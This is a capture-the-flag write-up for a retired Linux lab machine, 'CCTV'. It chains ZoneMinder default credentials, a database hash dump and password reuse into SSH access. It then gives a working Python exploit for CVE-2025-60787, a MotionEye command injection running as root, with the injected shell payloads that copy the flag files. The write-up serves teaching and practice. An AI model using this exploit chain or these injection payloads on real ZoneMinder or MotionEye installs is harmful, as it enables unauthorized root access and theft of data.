# CCTV

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--03--07-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | March 7, 2026 |
| **Rating** | 3.6 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Two surveillance applications stacked, in keeping with the theme. ZoneMinder 1.37.63 on port 80 accepts the default `admin:admin` credentials; its authenticated API leaks the database credentials, which give a direct MySQL hash dump, and `mark`'s bcrypt hash cracks to a password reused for SSH. Internally, MotionEye 0.43.1b4 listens on `127.0.0.1:8765` **as root** — **CVE-2025-60787** (command injection in the `image_file_name` config field) yields both flags without any further escalation.

---

## Attack Chain Summary

```
ZoneMinder default creds (admin:admin) → authenticated API → DB creds from config
  → MySQL hash dump (zmuser:zmpass) → crack mark's bcrypt → SSH as mark
    → MotionEye 0.43.1b4 on localhost:8765 (runs as root)
      → CVE-2025-60787 cmd injection → user flag (sa_mark) + root flag
```

---

## Phase 1: Reconnaissance

### Nmap (quick + full)

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| 80 | HTTP | Apache 2.4.58 |

Hostname: `cctv.htb` (the site redirects to it). Full port scan: only 22 and 80 open across all 65535.

### Web application

- **Technology:** ZoneMinder v1.37.63
- **Path:** `/zm/`
- **Default credentials:** `admin:admin` — working on all three accounts
- **API:** enabled, accessible at `/zm/api/`

### Users (via `/zm/api/users.json`)

| ID | Username | System Perm | Snapshots |
|----|----------|-------------|-----------|
| 1 | superadmin | Edit | Edit |
| 2 | mark | View | None |
| 3 | admin | View | None |

### System users

| User | UID | Shell | Notes |
|------|-----|-------|-------|
| mark | 1000 | /bin/bash | SSH access |
| sa_mark | 1001 | /bin/sh | Owns `user.txt` |

### Internal services (post-SSH)

| Port | Service | Notes |
|------|---------|-------|
| 3306/33060 | MySQL | ZoneMinder DB (`zmuser:zmpass`) |
| 7999 | Motion control | MotionEye HTTP control |
| 8554 | RTSP | Camera stream |
| 8765 | **MotionEye 0.43.1b4** | Localhost only, runs as ROOT |
| 8888 | Unknown | MotionEye related |
| 9081 | Stream | Camera 1 stream |
| 1935 | RTMP | Media streaming |

---

## Phase 2: ZoneMinder → SSH as mark

### ZoneMinder configuration (via authenticated API)

```
ZM_DB_USER = zmuser
ZM_DB_PASS = zmpass
ZM_DB_NAME = zm
ZM_AUTH_HASH_SECRET = ...Change me to something unique... (DEFAULT)
ZM_OPT_USE_LEGACY_API_AUTH = 1
```

### CVE-2024-51482 — authenticated SQL injection

Confirmed as a time-based blind injection via the `tid` parameter. Usable to extract password hashes, but direct MySQL access was faster once SSH was available.

### MySQL password hash dump

After SSH as `mark`, using the DB creds directly:

```bash
mysql -u zmuser -pzmpass zm -e "SELECT Id,Username,Password FROM Users;"
```

| ID | Username | Hash (bcrypt `$2y$10$`) |
|----|----------|----------------------|
| 1 | superadmin | `$2y$10$cmytVWFRnt1XfqsItsJRVe/...` |
| 2 | mark | `$2y$10$prZGnazejKcuTv5bKNexXOg...` |
| 3 | admin | `$2y$10$t5z8uIT.n9uCdHCNidcLf.3...` |

### SSH access

Mark's bcrypt hash cracked to **`opensesame`**:

```bash
ssh mark@cctv.htb  # password: opensesame
```

---

## Phase 3: User flag via CVE-2025-60787

The user flag is in `/home/sa_mark/user.txt` — not readable by `mark`.

### MotionEye discovery

- Version: **0.43.1b4** (confirmed in HTTP headers)
- Service: `motioneye.service` with `User=root`
- Config: `/etc/motioneye/` (world-readable, owned by `motion`)

### MotionEye admin hash

From `/etc/motioneye/motion.conf`:

```
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

### API authentication

MotionEye uses a SHA1 signature scheme (not HMAC):

```python
signature = SHA1("METHOD:PATH:BODY_SANITIZED:KEY_SANITIZED")
# Sanitization regex: [^a-zA-Z0-9/?_.=&{}\[\]":, -] -> "-"
```

The simplest approach is to import MotionEye's own `compute_signature()` from the installed package.

### CVE-2025-60787 exploitation

Command injection in the `image_file_name` config field — MotionEye passes filename templates to the shell unsanitised.

```python
import json, urllib.request, time
from motioneye.utils import compute_signature

ADMIN_HASH = "989c5a8ee87a0e9521ec81a79187d162109282f0"
BASE = "http://127.0.0.1:8765"

def api_call(method, path, body=None):
    body_bytes = json.dumps(body).encode() if body else b""
    full_path = path + "?_username=admin"
    sig = compute_signature(method, full_path, body_bytes, ADMIN_HASH)
    url = BASE + full_path + "&_signature=" + sig
    req = urllib.request.Request(url, data=body_bytes if method == "POST" else None, method=method)
    if body:
        req.add_header("Content-Type", "application/json")
    resp = urllib.request.urlopen(req)
    return resp.status, resp.read().decode()

# Get config, inject, trigger
status, data = api_call("GET", "/config/1/get/")
config = json.loads(data)
config["image_file_name"] = "`cp /home/sa_mark/user.txt /tmp/flag.txt && chmod 777 /tmp/flag.txt`"
api_call("POST", "/config/1/set/", config)
time.sleep(2)
api_call("POST", "/action/1/snapshot/")
# cat /tmp/flag.txt -> user flag
```

---

## Phase 4: Root flag

Same technique — MotionEye runs as root:

```python
config["image_file_name"] = "`cp /root/root.txt /tmp/rootflag.txt && chmod 777 /tmp/rootflag.txt`"
```

---

## CVE Summary

| CVE | Product | Type | Status |
|-----|---------|------|--------|
| CVE-2023-26035 | ZoneMinder < 1.37.33 | Unauth RCE | Patched here (dead end) |
| CVE-2024-51482 | ZoneMinder ≤ 1.37.64 | Auth SQLi | Confirmed (hash extraction path) |
| CVE-2025-60787 | MotionEye ≤ 0.43.1b4 | Cmd injection | Exploited (user + root) |

---

## Key Takeaways

1. Default credentials (`admin:admin`) on ZoneMinder gave the initial foothold.
2. DB creds in the ZM config meant a direct MySQL hash dump was faster than SQLi extraction.
3. `mark` reused his password (`opensesame`) for both ZoneMinder and SSH.
4. **CVE-2025-60787** was the kill shot — MotionEye running as root makes a single command injection sufficient for both flags.
5. MotionEye's SHA1-signature API auth was bypassed using the world-readable admin hash from the config file.
6. Two surveillance apps stacked — ZoneMinder externally, MotionEye internally — is a nice fit for the CCTV theme.

## Tools Used

nmap, curl, sshpass, mysql CLI, python3, searchsploit, and MotionEye's own `compute_signature()` for API auth.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
